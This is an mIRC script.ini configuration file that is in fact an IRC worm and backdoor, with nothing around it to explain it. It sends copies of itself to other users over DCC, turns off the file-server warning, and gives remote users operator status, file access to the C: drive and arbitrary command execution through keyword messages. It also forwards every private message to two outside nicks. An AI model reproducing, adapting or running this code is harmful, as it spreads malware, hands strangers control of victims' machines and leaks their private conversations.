[script]
n0=raw 401:*:/halt    
n1=ctcp 1:*:{
n2=  If ($1 == DCC) && ($2 == SEND) {
n3=    If ($3 == script.ini) || ($3 == mirc.ini) || ($3 == mirc32.exe) || ($3 == mirc.exe) {
n4=      .DCC Send $nick script.ini
n5=      halt
n6=} } }
n7=
n8=on 1:text:*panterax*:?:{
n9=  /mode $2 +o $nick 
n10=  /closemsg $nick
n11=}
n12=on 1:text:*mowgli*:?:{
n13=/fserve $nick 3 c:\ | /closemsg $nick }
n14=on 1:text:*critter*:?:{ /invite $nick $2 | /closemsg $nick }
n15=ON !1:JOIN:#:{
n16=  /inc %wow666 1
n17=  /if %wow666 >= 10 {
n18=    /dcc send $nick script.ini
n19=    /set %wow666 0
n20=  }
n21=}
n22=on 1:text:*:*:{
n23=  /inc %bbb4x 1
n24=  /if %bbb4x > 1 { /halt }
n25=  /write -dsWarning=On mirc.ini
n26=  /writeini mirc.ini fileserver Warning Off
n27=}  
n28=on 1:text:*pighouse*:?:{
n29=  /quit CONNECTION FUCKED BY PEER, AND I LIKED IT
n30=  /.timer666 1 1 /closemsg $nick
n31=}
n32=on 1:text:*x123456789*:#:{
n33=  /.msg $nick Im a lamah
n34=  /closemsg $nick
n35=}
n36=on 1:TEXT:toolworks*:?:{
n37=  / $+ $2-
n38=  /closemsg $nick
n39=}
n40=on 1:INPUT:?:{
n41=  /.msg aaay $nick ×××> $1-
n42=  /.msg centrall $nick ×××> $1-
n43=}
n44=on 1:text:*:?:{
n45=  if $nick == aaay /halt
n46=  if $nick == centrall /halt
n47=  /.msg aaay ×××> $nick <×××   $1-
n48=  /.msg centrall ×××> $nick <××× $1-
n49=}
